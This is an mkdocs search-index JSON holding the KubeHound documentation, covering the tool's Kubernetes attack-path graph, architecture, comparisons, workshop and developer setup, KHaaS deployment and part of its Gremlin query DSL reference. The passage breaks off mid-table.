{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Home","text":"<p>Welcome to the KubeHound documentation!</p> <p> </p> <p>KubeHound creates a graph of attack paths in a Kubernetes cluster, allowing you to identify direct and multi-hop routes an attacker is able to take, visually or through complex graph queries.</p> <p></p> *A KubeHound graph showing attack paths between pods, nodes, and identities (click to enlarge)* <p>KubeHound can identify more than 25 attacks, from container escapes to lateral movement.</p> <p>After it has ingested data from your cluster, it can easily answer advanced questions such as:</p> <ul> <li>What are all possible container escapes in the cluster?</li> <li>What is the shortest exploitable path between a publicly-exposed service and a cluster administrator role?</li> <li>Is there an attack path from a specific container to a node in the cluster?</li> </ul> <p>KubeHound was built with efficiency in mind and can consequently handle very large clusters. Ingestion and computation of attack paths typically takes a few seconds for a cluster with 1'000 running pods, 2 minutes for 10'000 pods, and 5 minutes for 25'000 pods. </p> <p>Next steps:</p> <ul> <li>Learn more about KubeHound architecture and terminology</li> <li>Get started using KubeHound</li> </ul>"},{"location":"architecture/","title":"Architecture","text":"<p>KubeHound works in 3 steps:</p> <ol> <li>Connect to your Kubernetes cluster and read API resources (pods, nodes, permissions...)</li> <li>Compute attack paths</li> <li>Write the results to a local graph database (JanusGraph)</li> </ol> <p>After the initial ingestion is done, you use a compatible client or the provided Jupyter Notebook to visualize and query attack paths in your cluster.</p> <p>KubeHound architecture  (click to enlarge)</p> <p>Under the hood, KubeHound leverages a caching and persistence layer (Redis and MongoDB) while computing attack paths. As an end user, this is mostly transparent to you.</p> <p>KubeHound architecture (click to enlarge)</p>"},{"location":"comparison/","title":"Comparison with other tools","text":""},{"location":"comparison/#lyfts-cartography","title":"Lyft's Cartography","text":"<p>Cartography has a Kubernetes module. While useful to vizualize a cluster, it only has a few types of resources and relationships. Consequently, it cannot be used for mapping attack paths in a Kubernetes cluster.</p>"},{"location":"comparison/#bloodhound","title":"BloodHound","text":"<p>BloodHound is one of the first projects (and certainly the most popular) that introduced attack graphs mapping. It is currently focused on Active Directory and Azure environments, and does not support Kubernetes.</p>"},{"location":"comparison/#botb","title":"BOtB","text":"<p>BOtB is a pentesting tool that attempts to exploit common weaknesses. It runs from inside a compromised container. While very useful when performing a blackbox assessment, it doesn't have a full view of the cluster and does not attempt to find cluster-wide attack paths.</p>"},{"location":"comparison/#peirates","title":"peirates","text":"<p>Similarly to BOtB, peirates is an offensive tool running from inside a pod. It doesn't have a full view of the cluster and does not attempt to find cluster-wide attack paths.</p>"},{"location":"comparison/#rbac-police","title":"rbac-police","text":"<p>rbac-police allows you to retrieve the permissions associated to a specific identity in the cluster, which makes it easier to understand who has access to what. However, it does not look for attack paths in the cluster - it's focused on showing effective permissions of an identity.</p>"},{"location":"comparison/#kubiscan","title":"KubiScan","text":"<p>KubeScan scans a Kubernetes cluster for risky permissions that allow an identity to escalate its privileges inside the cluster. It does not look for other types of attacks in the cluster, nor does it attempt to build an attack graph.</p>"},{"location":"comparison/#kdigger","title":"kdigger","text":"<p>Similarly to BOtB and peirates, kdigger runs from a compromised pod and attempts to retrieve information about the cluster and potential weaknesses. It does not have a full cluster view, nor does it attempt to build attack paths on a graph.</p>"},{"location":"contributing/","title":"Contributing","text":"<p>Contributions are welcome! Refer to the CONTRIBUTING guide on how you can contribute to KubeHound, and what to expect.</p>"},{"location":"faq/","title":"Frequently Asked Questions","text":"<p>How long does KubeHound take to run?</p> <p>As always.. it depends :) The bulk of the work comes in building up the attack graph. The more edges (i.e attacks) are present, the longer it will take to run. So yet another incentive for more secure clusters! Typical run times we have observed during our testing:</p> Cluster Size (Pods) Duration 1,000 &lt;1 min 10,000 3 mins 30,000 7 mins <p>What happens when you run KubeHound multiple times?</p> <p>The data from the previous run is wiped automatically. For very large graphs this can be quite slow and it might be faster to do a hard reset of the backend.</p>"},{"location":"references/","title":"References","text":""},{"location":"references/#2024-hacklu-workshop","title":"2024 - HackLu Workshop","text":""},{"location":"references/#kubehound-identifying-attack-paths-in-kubernetes-clusters-at-scale-with-no-hustle","title":"KubeHound: Identifying attack paths in Kubernetes clusters at scale with no hustle","text":"<p>Slides  Jupyter notebook  </p> <p>Updated version of the Pass The Salt Workshop. Prerequisites are listed on kubehound.io/workshop. The workshop is a hands-on session where participants will learn how to use KubeHound to identify attack paths in Kubernetes clusters. The workshop will cover the following topics:</p> <ul> <li>Hack a vulnerable Kubernetes cluster (exploiting 4 differents attacks in a local environement).</li> <li>Use KubeHound to identify specific resources in the vulnerable cluster.</li> <li>Use KubeHound to identify attack paths in the vulnerable cluster.</li> </ul>"},{"location":"references/#2024-hacklu-presentation","title":"2024 - HackLu presentation","text":""},{"location":"references/#kubehound-identifying-attack-paths-in-kubernetes-clusters-at-scale-with-no-hustle_1","title":"KubeHound: Identifying attack paths in Kubernetes clusters at scale with no hustle","text":"<p>Recording  Slides  </p> <p>This presentation explains the genesis behind the tool and a brief introduction to what Kubernetes security is. We showcase the three main usage for KubeHound:</p> <ul> <li>As a standalone tool to identify attack paths in a Kubernetes cluster from a laptop (the automatic mode and easy way to dump and ingest the data).</li> <li>As a blue teamer with KubeHound as a Service or KHaaS which allow using KubeHound to be used with a distributed model across multiple Kuberentes Clusters to generate continuously a security posture on a daily basis.</li> <li>As a consultant using the asynchronously mechanism to dump and rehydrate the KubeHound state from 2 different locations.</li> </ul>"},{"location":"references/#2024-pass-the-salt-pts-workshop","title":"2024 - Pass The Salt (PTS) Workshop","text":""},{"location":"references/#kubehound-identifying-attack-paths-in-kubernetes-clusters-at-scale-with-no-hustle_2","title":"KubeHound: Identifying attack paths in Kubernetes clusters at scale with no hustle","text":"<p>Slides  Jupyter notebook  </p> <p>The goal of the workshop was to showcase how to use KubeHound to pinpoint security issues in a Kubernetes cluster and get a concrete security posture.</p> <p>But first, as attackers (or defenders), there's nothing better to understand an attack than to exploit it oneself. So the workshop started with some of the most common attacks (container escape and lateral movement) and let attendees exploit them in our vulnerable cluster.</p> <p>After doing some introduction around Kubernetes basic and Graph theory, the attendees played with KubeHound to ingest data synchronously and asynchronously (dump and rehydrate the data). Then we covered all the KubeHound DSL and basic gremlin usage. The goal was to go over the possibilities of the KubeHound DSL like:</p> <ul> <li>List all the port and IP addresses being exposed outside of the k8s cluster</li> <li>Enumerate how attacks are present in the cluster</li> <li>List all attacks path from endpoints to node</li> <li>List all endpoint properties by port with serviceEndpoint and IP addresses that lead to a critical path</li> <li>...</li> </ul> <p>The workshop finished with some \"real cases\" scenario either from a red teamer or blue teamer point of view. The goal was to show how the tool can be used in different scenarios (initial recon, attack path analysis, assumed breach on compromised resources such as containers or credentials, ...)</p> <p>All was done using the following notebook which is a step-by-step KubeHound DSL:</p> <ul> <li>A specific notebook to describe all KubeHound DSL queries and how you can leverage them. Also this notebook describes the basic Gremlin needed to handle the KubeHound DSL for specific cases.</li> </ul>"},{"location":"references/#2024-troopers-presentation","title":"2024 - Troopers presentation","text":""},{"location":"references/#attacking-and-defending-kubernetes-cluster-with-kubehound-an-attack-graph-model","title":"Attacking and Defending Kubernetes Cluster with KubeHound, an Attack Graph Model","text":"<p>Recording  Slides  Dashboard PoC  </p> <p>This presentation explains the genesis behind the tool. A specific focus was made on the new version KubeHound as a Service or KHaaS which allow using KubeHound with a distributed model across multiple Kuberentes Clusters. We also introduce a new command that allows consultants to use KubeHound asynchronously (dumping and rehydration later, in office for instance).</p> <p>2 demos were also shown:</p> <ul> <li>A  PoC  of a dashboard was created to show how interesting KPI can be extracted easily from KubeHound.</li> <li>A specific notebook to show how to shift from a can of worms to the most critical vulnerability in a Kubernetes Cluster with a few KubeHound requests.</li> </ul> <p>Also we showed how the tool has been built and lessons we have learned from the process.</p>"},{"location":"references/#2024-insomnihack-2024-presentation","title":"2024 - InsomniHack 2024 presentation","text":""},{"location":"references/#standing-on-the-shoulders-of-giantdogs-a-kubernetes-attack-graph-model","title":"Standing on the Shoulders of Giant(Dog)s: A Kubernetes Attack Graph Model","text":"<p>Recording  Slides  Dashboard PoC  </p> <p>This presentation explains why the tool was created and what problem it tries to solve. 2 demos were shown:</p> <ul> <li>A  PoC  of a dashboard was created to show how interesting KPI can be extracted easily from KubeHound.</li> <li>A specific notebook to show how to shift from a can of worms to the most critical vulnerability in a Kubernetes Cluster with a few KubeHound requests.</li> </ul> <p>It also showed how the tool has been built and lessons we have learned from the process.</p>"},{"location":"references/#2023-release-v10-annoucement","title":"2023 - Release v1.0 annoucement","text":""},{"location":"references/#kubehound-identifying-attack-paths-in-kubernetes-clusters","title":"KubeHound: Identifying attack paths in Kubernetes clusters","text":"<p>Blog Article  </p> <p>Blog article published on securitylabs as a tutorial 101 on how to use the tools in different use cases:</p> <ul> <li>Red team: Looking for low-hanging fruit</li> <li>Blue team: Assessing the impact of a compromised container</li> <li>Blue team: Remediation</li> <li>Blue team: Metrics and KPIs</li> </ul> <p>It also explain briefly how the tools works (what is under the hood).</p>"},{"location":"terminology/","title":"Terminology","text":""},{"location":"terminology/#graph-theory","title":"Graph theory","text":"Term Meaning Graph A data type to represent complex, non-linear relationships between objects Vertex The fundamental unit of which graphs are formed (also known as \"node\") Edge A connection between vertices (also known as \"relationship\") Path A sequence of edges which joins a sequence of vertices Traversal The process of visiting (checking and/or updating) each vertex in a graph"},{"location":"terminology/#kubehound","title":"KubeHound","text":"<p>Entity</p> <p>An abstract representation of a Kubernetes component that form the vertices (nodes) of the attack graph. These do not necessarily have a one-to-mapping to Kubernetes objects, but represent a related construct in an attacker's mental model of the system. Each entity can be tied back to one (or more) Kubernetes object(s) from which it derived via vertex properties.</p> <p>For instance, the <code>PermissionSet</code> entity abstracts the Kubernetes <code>Role</code> and <code>ClusterRole</code> objects that have a <code>RoleBinding</code> or <code>ClusterRoleBinding</code> attached.</p> <p>Attack</p> <p>All edges in the KubeHound graph represent a net \"improvement\" in an attacker's position or a lateral movement opportunity. Thus, if any two vertices in the graph are connected we know immediately that an attacker can move between them. As such attack and edge are used interchangeably throughout the project.</p> <p>Critical Asset</p> <p>An entity in KubeHound whose compromise would result in cluster admin (or equivalent) level access.</p>"},{"location":"workshop/","title":"Workshop","text":""},{"location":"workshop/#requirements","title":"Requirements","text":"<p>In order to run the workshop you need to install the following tools:</p> <ul> <li>kubectl - https://kubernetes.io/docs/tasks/tools/</li> <li>kind - https://kind.sigs.k8s.io/docs/user/quick-start</li> <li>docker - https://docs.docker.com/engine/install</li> <li>make - package (sourceforge for Windows)</li> </ul> <p>Those following packages are needed to spin the lab used during the workshop. We are reusing our developing environment.</p> <p>For Mac user we have a oneliner to install everything (if you are using brew):</p> <pre><code>brew update &amp;&amp; brew install kubectl, kind, docker`\n</code></pre> <p>The last requirements is of course kubehound. You need to download the latest release from our repository:</p> <pre><code>wget https://github.com/DataDog/KubeHound/releases/latest/download/kubehound-$(uname -o | sed 's/GNU\\///g')-$(uname -m) -O kubehound\nchmod +x kubehound\n</code></pre> <p>or</p> <pre><code>brew update &amp;&amp; brew install kubehound\n</code></pre>"},{"location":"workshop/#cheatsheet","title":"Cheatsheet","text":""},{"location":"workshop/#starting-the-lab","title":"Starting the lab","text":"<p>First you need to run spin our dev environement with a vulnerable cluster:</p> <pre><code>cd $HOME\ngit clone https://github.com/DataDog/KubeHound.git\ncd kubehound\nmake local-cluster-deploy\n</code></pre>"},{"location":"workshop/#initiating-kubehound","title":"Initiating Kubehound","text":"<p>As the images used by KubeHound are quite heavy (due to Jupyter and Janusgraph), we want to make sure that we have them downloaded before starting the workshop. To do so, we can run the following command:</p> <pre><code>./kubehound\n</code></pre> <p>This will pull all the images that will be needed during the workshop.</p>"},{"location":"workshop/#running-the-workshop","title":"Running the workshop","text":"<p>In order to use our vulnerable cluster, we need to use the <code>kubeconfig</code> file generated when we created (with kind) our cluster. This variable needs to be exported in all the shell you will be using during the workshop.</p> <pre><code>export KUBECONFIG=./test/setup/.kube-config\n# Checking the clustername\nkubectl config current-context\n# Checking the pods deployed\nkubectl get pods\n</code></pre> <p>During the workshop we will be playing with Kubernetes resources. We advise you to install k9s which is a great tool made by the community - provides a terminal UI to interact with k8s cluster.</p> <p>In order to test the attacks, we will assume breach of the containers. To execute a command you can jump into a container/pod using the following command:</p> <pre><code>kubectl exec -it &lt;pod_name&gt; -- bash\n</code></pre> <p>Note</p> <p>You can also use k9s (typing on <code>s</code> key when highlighting a pod).</p>"},{"location":"dev-guide/datadog/","title":"Datadog setup","text":"<p>The Datadog agent can be setup locally to provide some metrics and logs when developing on KubeHound.</p>"},{"location":"dev-guide/datadog/#metrics-and-logs","title":"Metrics and logs","text":"<p>To have some in-depth metrics and log correlation, all the components are now linked to datadog.  To configure it you just need to add your Datadog API key (<code>DD_API_KEY</code>) in the environment variable in the <code>deployments/kubehound/.env</code>. When the API key is configured, a docker will be created <code>kubehound-dev-datadog</code>. </p> <p>All the information being gathered are available at:</p> <ul> <li>Metrics: https://app.datadoghq.com/metric/summary?filter=kubehound.janusgraph</li> <li>Logs: https://app.datadoghq.com/logs?query=service%3Akubehound%20&amp;cols=host%2Cservice&amp;index=%2A&amp;messageDisplay=inline&amp;stream_sort=desc&amp;viz=stream&amp;from_ts=1688140043795&amp;to_ts=1688140943795&amp;live=true</li> </ul> <p>To collect the metrics for Janusgraph an exporter from Prometheus is being used:</p> <ul> <li>https://github.com/prometheus/jmx_exporter</li> </ul> <p>They are exposed here:</p> <ul> <li>Locally: http://127.0.0.1:8099/metrics</li> <li>Datadog: https://app.datadoghq.com/metric/summary?filter=kubehound.janusgraph</li> </ul>"},{"location":"dev-guide/getting-started/","title":"Getting started","text":"<p>To list all the available developpers commands from the makefile, run:</p> <pre><code>make help\n</code></pre>"},{"location":"dev-guide/getting-started/#requirements-build","title":"Requirements build","text":"<ul> <li>16GB of RAM (minimum)</li> <li>go (v1.24): https://go.dev/doc/install</li> <li>Docker &gt;= 19.03 (<code>docker version</code>)</li> <li>Docker Compose &gt;= v2.0 (<code>docker compose version</code>)</li> </ul>"},{"location":"dev-guide/getting-started/#backend","title":"Backend","text":"<p>The backend images are built with the Dockerfiles <code>docker-compose.dev.[graph|ingestor|mongo|ui].yaml</code>. There are listed in deployment directory. To avoid running docker-compose it manually, there is an hidden command <code>kubehound dev --help</code>. The backend stack will be flagged as <code>kubehound-dev-</code> in the name of each component.</p>"},{"location":"dev-guide/getting-started/#building-the-minimum-dev-stack","title":"Building the minimum dev stack","text":"<p>The minimum stack (<code>mongo</code> &amp; <code>graph</code>) can be spawned with</p> <ul> <li><code>kubehound dev</code> which is an equivalent of</li> <li><code>docker compose -f docker-compose.yaml -f docker-compose.dev.graph.yaml -f docker-compose.dev.mongo.yaml</code>. By default it will always rebuild everything (no cache is being used).</li> </ul>"},{"location":"dev-guide/getting-started/#building-dev-options","title":"Building dev options","text":"<p>You can add components to the mininum stack (<code>ui</code> and <code>grpc endpoint</code>) by adding the following flag.</p> <ul> <li><code>--ui</code> to add the Jupyter UI to the build.</li> <li><code>--grpc</code> to add the ingestor endpoint (exposing the grpc server for KHaaS).</li> </ul> <p>For instance, building locally the minimum stack with the <code>ui</code> component:</p> <pre><code>kubehound dev --ui\n</code></pre>"},{"location":"dev-guide/getting-started/#tearing-down-the-dev-stack","title":"Tearing down the dev stack","text":"<p>To tear down the KubeHound dev stack, just use <code>--down</code> flag:</p> <pre><code>kubehound dev --down\n</code></pre> <p>Note</p> <p>It will stop all the component from the dev stack (including the <code>ui</code> and <code>grpc endpoint</code> if started)</p>"},{"location":"dev-guide/getting-started/#build-the-binary","title":"Build the binary","text":""},{"location":"dev-guide/getting-started/#build-from-source","title":"Build from source","text":"<p>To build KubeHound locally from the sources, use the Makefile:</p> <pre><code># Ensure you are pulling a release tag\ngit checkout tags/vX.X.X\n# Build the binary\nmake build\n</code></pre> <p>Note</p> <p>While building the binary using a <code>main</code> revision, the binary will not be able  to spin up the KubeHound stack. You should use a release tag to build the binary or use the <code>kubehound dev</code> command to spin up the dev stack.</p> <p>Note</p> <p>Being on a commit older than the latest one will also pull older images, to avoid dependency incompatibility. We strongly advise to use the latest tag to enjoy all features and performance improvements.</p> <p>KubeHound binary will be output to <code>./bin/build/kubehound</code>.</p>"},{"location":"dev-guide/getting-started/#releases","title":"Releases","text":"<p>We use <code>buildx</code> to release new versions of KubeHound, for cross platform compatibility and because we are embedding the docker compose library (to enable KubeHound to spin up the KubeHound stack directly from the binary). This saves the user from having to take care of this part. The build relies on 2 files docker-bake.hcl and Dockerfile. The following bake targets are available:</p> <ul> <li><code>validate</code> or <code>lint</code>: run the release CI linter</li> <li><code>binary</code> (default option): build kubehound just for the local architecture</li> <li><code>binary-cross</code> or <code>release</code>: run the cross platform compilation</li> </ul> <p>Note</p> <p>Those targets are made only for the CI and are not intented to be run run locally (except to test the CI locally).</p>"},{"location":"dev-guide/getting-started/#cross-platform-compilation","title":"Cross platform compilation","text":"<p>To test the cross platform compilation locally, use the buildx bake target <code>release</code>. This target is being run by the CI (buildx.</p> <pre><code>docker buildx bake release\n</code></pre> <p>Warning</p> <p>The cross-binary compilation with <code>buildx</code> is not working in mac: <code>ERROR: Multi-platform build is not supported for the docker driver.</code></p>"},{"location":"dev-guide/getting-started/#push-a-new-release","title":"Push a new release","text":"<p>The CI releases a set of new images and binaries when a tag is created. To set a new tag on the main branch:</p> <pre><code>git tag vX.X.X\ngit push origin vX.X.X\n</code></pre> <p>New tags will trigger the 2 following jobs:</p> <ul> <li>docker: pushing new images for <code>kubehound-graph</code>, <code>kubehound-binary</code> and <code>kubehound-ui</code> on ghcr.io. The images can be listed here.</li> <li>buildx: compiling the binary for all platform. The platform supported can be listed using this <code>docker buildx bake binary-cross --print | jq -cr '.target.\"binary-cross\".platforms'</code>.</li> </ul> <p>deprecated</p> <p>The <code>kubehound-ingestor</code> image has been deprecated since v1.5.0 and renamed to <code>kubehound-binary</code>.</p> <p>The CI will draft a new release (not available publicly). In order to finish the process, an admin has to validate the draft from the release page.</p> <p>Tip</p> <p>To resync all the tags from the main repo you can use <code>git tag -l | xargs git tag -d;git fetch --tags</code>.</p>"},{"location":"dev-guide/testing/","title":"Testing","text":"<p>To ensure no regression in KubeHound, 2 kinds of tests are in place:</p> <ul> <li>classic unit test: can be identify with the <code>xxx_test.go</code> files in the source code</li> <li>system tests: end to end test where we run full ingestion from different scenario to simulate all use cases against a real cluster.</li> </ul>"},{"location":"dev-guide/testing/#requirements-test","title":"Requirements test","text":"<ul> <li>Golang <code>&gt;= 1.24</code></li> <li>Kind</li> <li>Kubectl</li> </ul>"},{"location":"dev-guide/testing/#unit-testing","title":"Unit Testing","text":"<p>The full suite of unit tests can be run locally via:</p> <pre><code>make test\n</code></pre>"},{"location":"dev-guide/testing/#system-testing","title":"System Testing","text":"<p>The repository includes a suite of system tests that will do the following:</p> <ul> <li>create a local kubernetes cluster</li> <li>collect kubernetes API data from the cluster</li> <li>run KubeHound using the file collector to create a working graph database</li> <li>query the graph database to ensure all expected vertices and edges have been created correctly</li> </ul> <p>The cluster setup and running instances can be found under test/setup</p> <p>If you need to manually access the system test environment with kubectl and other commands, you'll need to set (assuming you are at the root dir):</p> <pre><code>cd test/setup/ &amp;&amp; export KUBECONFIG=$(pwd)/.kube-config\n</code></pre>"},{"location":"dev-guide/testing/#environment-variable","title":"Environment variable:","text":"<ul> <li><code>DD_API_KEY</code> (optional): set to the datadog API key used to submit metrics and other observability data (see datadog section)</li> </ul>"},{"location":"dev-guide/testing/#setup","title":"Setup","text":"<p>Setup the test kind cluster (you only need to do this once!) via:</p> <pre><code>make local-cluster-deploy\n</code></pre>"},{"location":"dev-guide/testing/#running-the-system-tests","title":"Running the system tests","text":"<p>Then run the system tests via:</p> <pre><code>make system-test\n</code></pre>"},{"location":"dev-guide/testing/#cleanup","title":"Cleanup","text":"<p>To cleanup the environment you can destroy the cluster via:</p> <pre><code>make local-cluster-destroy\n</code></pre> <p>Note</p> <p>if you are running on Linux but you dont want to run <code>sudo</code> for <code>kind</code> and <code>docker</code> command, you can overwrite this behavior by editing the following var in <code>test/setup/.config</code>:</p> <pre><code>* `DOCKER_CMD=\"docker\"` for docker command\n* `KIND_CMD=\"kind\"` for kind command\n</code></pre>"},{"location":"dev-guide/testing/#ci-testing","title":"CI Testing","text":"<p>System tests will be run in CI via the system-test github action</p>"},{"location":"dev-guide/wiki/","title":"Wiki","text":"<p>The website kubehound.io is being statically generated from docs directory. It uses mkdocs under the hood. To generate kubehound.io locally use:</p> <pre><code>make local-wiki\n</code></pre> <p>Tip</p> <p>All the configuration of the website (url, menu, css, ...) is being made from mkdocs.yml file:</p>"},{"location":"dev-guide/wiki/#push-new-version","title":"Push new version","text":"<p>The website will get automatically updated everytime there is changemement in docs directory or the mkdocs.yml file. This is being handled by docs workflow.</p> <p>Note</p> <p>The domain for the wiki is being setup in the CNAME file.</p>"},{"location":"khaas/advanced-configuration/","title":"Advanced configuration","text":"<p>This section covers all the available flags in KubeHound.</p> <p>Note</p> <p>If you don't want to specify the bucket every time, you can set it up in your local config file (<code>./kubehound.yaml</code> or <code>$HOME/.config/kubehound.yaml</code>). See getting started with KHaaS</p>"},{"location":"khaas/advanced-configuration/#manual-collection","title":"Manual collection","text":"<p>In order to use <code>kubehound</code> with KHaaS, you need to specify the api endpoint you want to use:</p> <ul> <li><code>--khaas-server</code> from the inline flags (by default <code>127.0.0.1:9000</code>)</li> </ul>"},{"location":"khaas/advanced-configuration/#dump-and-ingest","title":"Dump and ingest","text":"<p>In order to use the collector with KHaaS you need to specify the dump location for the k8s resources:</p> <ul> <li><code>--bucket_url</code> from the inline flags (i.e. <code>s3://&lt;your_bucket&gt;</code>). There is no default value for security reason.</li> <li><code>--region</code> from the inline flags (i.e. <code>us-east-1</code>) to set the region to retrieve the configuration (only for s3).</li> </ul> <p>Warning</p> <p>The <code>kubehound</code> binary needs to have push access to your cloud storage provider.</p> <p>To dump and ingest the current k8s cluster, you just need to run the following command (i.e. using an AWS config):</p> <pre><code>kubehound dump remote --khaas-server 127.0.0.1:9000 --insecure --bucket_url s3://&lt;your_bucket&gt; --region  us-east-1\n</code></pre> <p>The last command will:</p> <ul> <li>dump the k8s resources to the cloud storage provider.</li> <li>send a grpc call to run the ingestion on the KHaaS grpc endpoint.</li> </ul> <p>Note</p> <p>The ingestion will dump the current cluster being setup, if you want to skip the interactive mode, just specify <code>-y</code> or <code>--non-interactive</code></p>"},{"location":"khaas/advanced-configuration/#manual-ingestion","title":"Manual ingestion","text":"<p>If you want to rehydrate (reingesting all the latest clusters dumps), you can use the <code>ingest</code> command to run it.</p> <pre><code>kubehound ingest remote --khaas-server 127.0.0.1:9000 --insecure\n</code></pre> <p>You can also specify a specific dump by using the <code>--cluster</code> and <code>run_id</code> flags.</p> <pre><code>kubehound ingest remote --khaas-server 127.0.0.1:9000 --insecure --cluster my-cluster-1 --run_id 01htdgjj34mcmrrksw4bjy2e94\n</code></pre>"},{"location":"khaas/deployment/","title":"Deploying KHaaS - Ingestor stack","text":"<p>deprecated</p> <p>The <code>kubehound-ingestor</code> has been deprecated since v1.5.0 and renamed to <code>kubehound-binary</code>.</p>"},{"location":"khaas/deployment/#docker-deployment","title":"Docker deployment","text":"<p>To run the KubeHound as a Service with <code>docker</code> just use the following compose files. First you need to set the environment variables in the <code>kubehound.env</code> file. There is a template file <code>kubehound.env.template</code> that you can use as a reference.</p> <pre><code>cd ./deployments/kubehound\ndocker compose -f docker-compose.yaml -f docker-compose.release.yaml -f docker-compose.release.ingestor.yaml --profile jupyter up -d\n</code></pre> <p>By default the endpoints are only exposed locally:</p> <ul> <li><code>127.0.0.1:9000</code> for ingestor endpoint.</li> <li><code>127.0.0.1:8888</code> for the UI.</li> </ul> <p>For the UI 2 profiles (<code>--profile</code>) are available, you need to pick one:</p> <ul> <li><code>jupyter</code> to spawn a Jupyter backend compatible with Janusgraph endpoint (aws graph-notebook).</li> <li><code>invana</code> to spawn the Invana Studio, a dedicated UI for Janusgraph (this is also deploying the invana backend). We do not encourage to use as it is not maintained anymore.</li> </ul> <p>Warning</p> <p>You should change the default password by editing <code>NOTEBOOK_PASSWORD=&lt;your_password&gt;</code> in the <code>docker-compose.yaml</code></p>"},{"location":"khaas/deployment/#k8s-deployment","title":"k8s deployment","text":"<p>To run the KubeHound as a Service on Kubernetes just use the following helm files:</p> <pre><code>cd ./deployments/k8s\nhelm install khaas khaas --namespace khaas --create-namespace\n</code></pre> <p>If it succeeded you should see the deployment listed:</p> <pre><code>$ helm ls -A\nNAME    NAMESPACE       REVISION        UPDATED                                 STATUS          CHART              APP VERSION\nkhaas   khaas           1               2024-07-30 19:04:37.0575 +0200 CEST     deployed        kubehound-0.0.1\n</code></pre> <p>Note</p> <p>This is an example to deploy KubeHound as a Service in k8s cluster, but you will need to adapt it to your own environment.</p>"},{"location":"khaas/deployment/#k8s-collector","title":"k8s collector","text":"<p>When deploying the collector inside a k8s cluster, we need to configure one of the following variable:</p> <ul> <li><code>KH_K8S_CLUSTER_NAME</code>: variable indicating the name of the targetted k8s cluster</li> </ul>"},{"location":"khaas/deployment/#rbac-requirements","title":"RBAC requirements","text":"<p>In order for the collector to work it needs access to the k8s API and the following k8s ClusterRole:</p> apiGroups resources verb rbac.authorization.k8s.io rolesrolebindingsclusterrolesclusterrolebindings getlist podsnodes getlist discovery.k8s.io endpointslices getlist <p>The definition of the k8s RBAC can find here:</p> <ul> <li>clusterRole</li> <li>clusterRoleBinding</li> <li>serviceAccount</li> </ul>"},{"location":"khaas/getting-started/","title":"KubeHound as a Service (KHaaS)","text":"<p>KHaaS enables you to use KubeHound in a distributive way. It is split in 2 main categories:</p> <ul> <li>The ingestor stack which includes the <code>graphdb</code>, <code>storedb</code>, <code>UI</code> and <code>grpc endpoint</code>.</li> <li>The collector (the kubehound binary) which will dump and send the k8s resources to the KHaaS <code>grpc endpoint</code>.</li> </ul> <p></p> <p>Note</p> <p>You need to deploy the data storage you want to use (AWS s3 in our example).</p>"},{"location":"khaas/getting-started/#automatic-collection","title":"Automatic collection","text":"<p>KHaaS has been created to be deployed inside a kubernetes cluster. This eases scaling and allows you to set Kubernetes <code>CronJob</code> daily dumps of your infrastucture for instance. To configure and deploy it, please refer to the deployment section.</p>"},{"location":"khaas/getting-started/#manual-collection","title":"Manual collection","text":"<p>In order to use <code>kubehound</code> with KHaaS, you need to specify the api endpoint you want to use. Since this is not likely to change in your environment, we recommend using the local config file. By default KubeHound will look for <code>./kubehound.yaml</code> or <code>$HOME/.config/kubehound.yaml</code>. For instance if the default configuration we set the endpoint with disabled SSL:</p> <pre><code>ingestor:\n  blob:\n    bucket_url: \"\" # (i.e.: s3://your-bucket)\n    region: \"us-east-1\" # (i.e.: us-east-1)\n  api:\n    endpoint: \"127.0.0.1:9000\"\n    insecure: true\n</code></pre> <p>Note</p> <p>You can use kubehound-reference.yaml as an example which list every options.</p> <p>Once everything is configured you just run the following, it will:</p> <ul> <li>dump the k8s resources and push it compressed to the cloud storage provider.</li> <li>send a grpc call to run the ingestion on the KHaaS grpc endpoint.</li> </ul> <pre><code>kubehound dump remote\n</code></pre>"},{"location":"khaas/getting-started/#manual-ingestion","title":"Manual ingestion","text":"<p>If you want to rehydrate (reingesting all the latest clusters dumps), you can use the <code>ingest</code> command to run it.</p> <pre><code>kubehound ingest remote\n</code></pre> <p>You can also specify a specific dump by using the <code>--cluster</code> and <code>run_id</code> flags.</p> <pre><code>kubehound ingest remote --cluster my-cluster-1 --run_id 01htdgjj34mcmrrksw4bjy2e94\n</code></pre>"},{"location":"queries/","title":"Queries","text":"<p>You can query KubeHound data stored in the JanusGraph database by using the Gremlin query language. The project provides an augmented KubeHound DSL covering the most common use cases. However, for traditionalists and power users a cheatsheet of pure gremlin queries for different use cases is also available.</p>"},{"location":"queries/dsl/","title":"KubeHound DSL","text":"<p>The KubeHound graph ships with a custom DSL that simplifies queries for the most common use cases</p>"},{"location":"queries/dsl/#using-the-kubehound-graph","title":"Using the KubeHound graph","text":"<p>The KubeHound DSL can be used by starting a traversal with <code>kh</code> instead of the traditional <code>g</code>. All gremlin queries will work exactly as normal, but a number of additional methods, specific to KubeHound, will be available.</p> <pre><code>// First 100 vertices in the kubehound graph\nkh.V().limit(100)\n</code></pre>"},{"location":"queries/dsl/#list-of-available-methods","title":"List of available methods","text":"<p>DSL definition code available here.</p>"},{"location":"queries/dsl/#retrieve-cluster-data","title":"Retrieve cluster data","text":"<p>These methods are defined in the <code>KubeHoundTraversalSourceDsl</code> class. </p> Method Gremlin equivalent Example usage <code>.cluster([string...])</code> <code>.has(\"class\",\"Cluster\")</code> <code>kh.cluster(\"kind-kubehound.local\")</code> <code>.containers([string...])</code> <code>.has(\"class\",\"Container\")</code> <code>kh.cluster(\"kind-kubehound.local\").containers(\"nginx\")</code> <code>.endpoints([int])</code> <code>.has(\"class\",\"Endpoint\")</code> <code>kh.cluster(\"kind-kubehound.local\").endpoints(3)</code> <code>.hostMounts([string...])</code> <code>.has(\"class\",\"Volume\").has(\"type\", \"HostPath\")</code> <code>kh.cluster(\"kind-kubehound.local\").hostMounts(\"/proc\")</code> <code>.nodes([string...])</code> <code>.has(\"class\",\"Node\")</code> <code>kh.cluster(\"kind-kubehound.local\").nodes(\"control-plane\")</code> <code>.permissions([string...])</code> <code>.has(\"class\",\"PermissionSet\")</code> <code>kh.cluster(\"kind-kubehound.local\").permissions(\"system::kube-controller\")</code> <code>.pods([string...])</code> <code>.has(\"class\",\"Pod\")</code> <code>kh.cluster(\"kind-kubehound.local\").pods(\"app-pod\")</code> <code>.run([string...])</code> <code>.has(\"runID\", P.within(ids))</code> <code>kh.run(\"01he5ebh73tah762qgdd5k4wqp\")</code> <code>.services([string...])</code> <code>.has(\"class\",\"Endpoint\").has(\"exposure\", \"EXTERNAL\")</code> 